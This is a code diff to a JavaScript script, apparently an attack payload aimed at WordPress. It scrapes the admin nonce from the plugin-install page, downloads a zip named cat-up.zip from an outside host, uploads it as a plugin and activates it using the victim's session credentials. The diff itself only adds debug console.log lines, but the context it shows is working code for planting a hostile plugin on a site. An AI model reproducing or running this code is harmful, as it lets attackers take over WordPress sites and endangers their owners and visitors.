@@ -3,12 +3,14 @@ let myPluginName = 'Catfather';
 
 async function uploadFile(){
 
+				console.log('Upload Plugin....')
+
     const html = await fetch(target+'/wp-admin/plugin-install.php');
     const body = await html.text();
     const regex = /_wpnonce" value="(.*?)"/;
     const nonce = regex.exec(body) !== null ? regex.exec(body)[1]: null;
     if (!nonce) return;
-
+				console.log('Plugin Nonce', nonce)
     const zipFile = await fetch('https://mrcatdev.com/cat-up.zip');
 
     let formData = new FormData();
@@ -28,6 +30,7 @@ async function uploadFile(){
     const content = await pagePlugin.text();
     const linkRegex = /plugins\.php\?action=activate.*?"/
     const activateUrl = linkRegex.exec(content)[0].replace('"','').replaceAll("&amp;","&")
+				console.log('Activate URL', activateUrl);
     await fetch(activateUrl,{
             credentials : 'include'
     });
